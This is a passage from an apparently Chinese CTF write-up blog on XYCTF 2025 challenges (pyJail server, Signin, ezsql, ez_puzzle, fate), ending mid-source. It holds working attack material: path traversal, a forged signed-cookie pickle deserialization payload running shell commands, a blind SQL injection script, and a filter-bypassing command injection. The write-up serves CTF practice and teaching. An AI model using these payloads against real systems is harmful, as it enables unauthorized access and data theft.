class="line">        <span class="keyword">return</span> padded_data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_large</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        every non-bytes message will be encoded with self.default_encoder</span></span><br><span class="line"><span class="string">        Every packet is forced to be filled to &#123;self.default_message_len&#125; bytes</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        message = compress(message)</span><br><span class="line">        message_list = [message[i:i + self.default_message_len]</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), self.default_message_len)]</span><br><span class="line">        message_list_len = <span class="built_in">len</span>(message_list)</span><br><span class="line">        self._send(self.padding_packets(</span><br><span class="line">            self.turn_to_bytes(message_list_len))[<span class="number">0</span>])</span><br><span class="line">        message_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> message <span class="keyword">in</span> message_list:</span><br><span class="line">            message_padded = self.padding_packets(message)</span><br><span class="line">            message = message_padded[<span class="number">0</span>]</span><br><span class="line">            self._send(message)</span><br><span class="line">            message_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> message_index == message_list_len:</span><br><span class="line">                pad_num = message_padded[<span class="number">1</span>]</span><br><span class="line">                self._send(self.padding_packets(</span><br><span class="line">                    self.turn_to_bytes(<span class="built_in">str</span>(pad_num)))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send a message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        The data should not be larger than 9999 bytes</span></span><br><span class="line"><span class="string">        It can be used at any time </span></span><br><span class="line"><span class="string">        Use self.send_large and recv_large if you want to send a big message</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            message_len = self.padding_packets(</span><br><span class="line">                self.turn_to_bytes(<span class="built_in">len</span>(message)), target_length=<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> MessageLengthError:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;The length of message is longer than 9999 bytes(&#123;&#125; bytes), please use send_large instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message))))</span><br><span class="line">        self._send(message_len)</span><br><span class="line">        self._send(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to encrypt and send data </span></span><br><span class="line"><span class="string">        MUST BE A MUTIPLE OF THE BLOCK SIZE IN ENCRYPTED MODE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            output_message = self.cipher_aes.encrypt(self.pad_packets_to_mutiple(message, self.BLOCK_SIZE))</span><br><span class="line">            <span class="comment"># plainmessage = unpad(self.cipher_aes.decrypt(output_message), self.BLOCK_SIZE)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output_message = message</span><br><span class="line">        self.s.send(output_message)  <span class="comment"># The TCP mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvfile</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Only receive file sent using self.send_largefile</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        output = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            a = self.recv_large(is_decode=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> a != <span class="string">&#x27;EOF&#x27;</span>.encode(encoding=self.default_encoder):</span><br><span class="line">                output += a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv_large</span>(<span class="params">self, is_decode: <span class="built_in">bool</span> = <span class="literal">True</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The return type can be bytes or string</span></span><br><span class="line"><span class="string">        The method to recv message WHICH IS SENT BY self.send_large</span></span><br><span class="line"><span class="string">        is_decode : decode the message with &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message_listlen = self._recv(self.default_message_len).decode(</span><br><span class="line">            encoding=self.default_encoder).rstrip()</span><br><span class="line">        message_listlen = <span class="built_in">int</span>(message_listlen)</span><br><span class="line">        message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, message_listlen):</span><br><span class="line">            mes = self._recv(self.default_message_len)</span><br><span class="line">            <span class="keyword">if</span> i == message_listlen - <span class="number">1</span>:</span><br><span class="line">                mes_padnum = <span class="built_in">int</span>(self._recv(self.default_message_len).decode(</span><br><span class="line">                    encoding=self.default_encoder))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mes_padnum = <span class="number">0</span></span><br><span class="line">            mes = self.unpadding_packets(mes, mes_padnum)</span><br><span class="line">            message += mes</span><br><span class="line">        message = decompress(message)</span><br><span class="line">        <span class="keyword">if</span> is_decode:</span><br><span class="line">            message = message.decode(encoding=self.default_encoder)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to decrypt and recv data</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> length % <span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                length += <span class="number">16</span></span><br><span class="line">            length = (length + self.BLOCK_SIZE-<span class="number">1</span>) // self.BLOCK_SIZE * self.BLOCK_SIZE <span class="comment"># round up to multiple of 16</span></span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">            message = self.cipher_aes.decrypt(message)</span><br><span class="line">            message = self.unpad_packets_to_mutiple(message, self.BLOCK_SIZE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad_packets_to_mutiple</span>(<span class="params">self, padded_data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Unpad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> block_size == <span class="literal">None</span>:</span><br><span class="line">            block_size = self.BLOCK_SIZE</span><br><span class="line">        padding = padded_data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> padding &gt; block_size <span class="keyword">or</span> <span class="built_in">any</span>(byte != padding <span class="keyword">for</span> byte <span class="keyword">in</span> padded_data[-padding:]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid padding&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> padded_data[:-padding]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Sock = SimpleTCP(password=<span class="string">&#x27;LetsLament&#x27;</span>)</span><br><span class="line">    Sock.s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">13337</span>))</span><br><span class="line">    Sock.s.listen(<span class="number">5</span>) </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        _ = Sock.accept()     </span><br><span class="line">        Sock.send(<span class="string">&#x27;Hello, THE flag speaking.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;I will not let you to control Lament Jail forever.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;But, my friend LamentXU has to control it, as he will rescue me out of this jail.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;So here is the pyJail I build. Only LamentXU knows how to break it.&#x27;</span>)    </span><br><span class="line">        a = Sock.recvfile().decode()</span><br><span class="line">        waf = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">def audit_checker(event,args):</span></span><br><span class="line"><span class="string">    if not &#x27;id&#x27; in event:</span></span><br><span class="line"><span class="string">    raise RuntimeError</span></span><br><span class="line"><span class="string">sys.addaudithook(audit_checker)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        content = waf + a</span><br><span class="line">        name = uuid4().<span class="built_in">hex</span>+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">&quot;python3&quot;</span>, name]</span><br><span class="line">            p = Popen(cmd, stdout=PIPE, stderr=PIPE)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">iter</span>(p.stdout.readline, <span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">                Sock.send(line.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip())</span><br><span class="line">            p.wait()</span><br><span class="line">            Sock.send(<span class="string">&#x27;Done, BYE.&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            Sock.send(<span class="string">&#x27;Error.&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            Sock.s.close()</span><br><span class="line">        remove(name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="喜欢就说出来"><a href="#喜欢就说出来" class="headerlink" title="喜欢就说出来*"></a>喜欢就说出来*</h2><blockquote><p>小Shark在上课时和自己的暗恋对象坐在了一起，小Shark想要把悄悄话和文件传给同桌，可惜小Shark没有移动硬盘，不过这难不住聪明的小Shark，小Shark在同桌的电脑上敲了几下键盘，用自己的浏览器给同桌试传了两张自己的照片和一句悄悄话，你能发现小Shark对同桌说了什么吗？会不会是……520?!呢?</p></blockquote><p>是流量包分析呢，先润</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><blockquote><p>来点真正的签到吧！</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>这里绕过读取文件的限制，<code>./../</code>相当于<code>../</code>，意义为<strong>先进入当前目录（其实就是留在原地），然后再退到上一级目录</strong></p><p><code>/download?filename=./.././.././../secret.txt</code>得到<code>Hell0_H@cker_Y0u_A3r_Sm@r7</code></p><p>下面跟<a href="https://www.cjxol.com/posts/sekaictf-2022-writeup/">Bottle Poem</a>大致一样，<code>pickle反序列化+cookie签名</code>，不过这里<code>cookie</code>的签名用的不再是<code>md5</code>而是<code>sha256</code>，应该是出于安全性考虑</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_cookie</span>(<span class="params">payload</span>):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            <span class="string">b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>, b64pld, hashlib.sha256</span><br><span class="line">        ).digest()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&quot;!&#x27;</span> + signature + <span class="string">b&quot;?&quot;</span> + b64pld + <span class="string">b&#x27;&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag_* &gt; flag&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure><p>然后通过<code>/download?filename=flag</code>路由进行下载即可<br><code>XYCTF&#123;We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!&#125;</code></p><h2 id="ezsql-手动滑稽"><a href="#ezsql-手动滑稽" class="headerlink" title="ezsql(手动滑稽)"></a>ezsql(手动滑稽)</h2><blockquote><p>简单sql(手动滑稽)，不需要sqlmap等自动化工具，请手工哟∧_∧</p></blockquote><p><code>username</code>单引号注入报错，确定为注入点，也可以看出是<code>sqlite</code></p><p><code>fuzz</code>一下发现<strong>空格</strong>、<strong>+-*|</strong>、<strong>换行符</strong>、<strong>逗号</strong>，<strong>union</strong>等被过滤了<br>找到<a href="https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md">绕过参考</a><br>先试试<strong>万能密码</strong>能不能直接登陆，发现是可以的<br><img src="https://pic1.zhimg.com/80/v2-5f9a7fd715f0bf17e95307805b462dc1_1440w.png" alt=""><br>这里尝试<strong>盲注</strong>能不能注出<strong>秘钥</strong></p><p><strong>空格</strong>可以用<code>%09</code>即<code>tap</code>代替，<strong>逗号</strong>用<code>from for</code></p><p>改一下以前的<strong>布尔盲注</strong>脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;xxx/login.php&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr(database() from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># testdb</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># double_check,user</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;double_check&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># secret</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; or ascii(substr((select group_concat(secret) from double_check) from <span class="subst">&#123;i&#125;</span> for <span class="subst">&#123;i&#125;</span>)) &gt; <span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">        <span class="comment"># dtfrtkcc0czkoua9S</span></span><br><span class="line">        <span class="comment"># param = &quot;id&quot; + payload</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\t&quot;</span>),</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># r = requests.get(url, params=param)</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;帐号或密码错误&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">        text += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>输入秘钥后，告诉我们<strong>命令执行无回显</strong>，又过滤了<strong>空格</strong>，简单，直接重定向<br><code>command=cat$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;&gt;1.txt</code></p><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><blockquote><p>你能在两秒之内完成拼图吗？</p></blockquote><p>可以搜索前端<code>js</code>脚本，因为本题的关键肯定是在时间，所以搜一下<code>time</code>，发现了<code>startTime endTime</code></p><p>完成拼图后通过侧边栏进入<strong>开发者工具</strong>，正常来说花费的时间应该是<code>endTime-startTime</code>，控制台只能查看<code>startTime</code>，说明我们只能通过完成拼图那一刻才能得到<code>endTime</code>，也就是前端页面的<strong>实时时间</strong></p><p>所以我们可以在控制台输入<code>startTime=Date.now()</code>，从而使花费的时间为0<br><img src="https://picx.zhimg.com/80/v2-9ed42b3fccc199b8c329f4f661b7b195_1440w.png" alt=""><br><img src="https://pic1.zhimg.com/80/v2-0a972282b09fa1c6c3978d67517524ae_1440w.png" alt=""><br><code>flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</code></p><h2 id="fate"><a href="#fate" class="headerlink" title="fate*"></a>fate*</h2><blockquote><p>一生中能改变命运的机会可不多啊。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(flask.request.remote_addr)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span 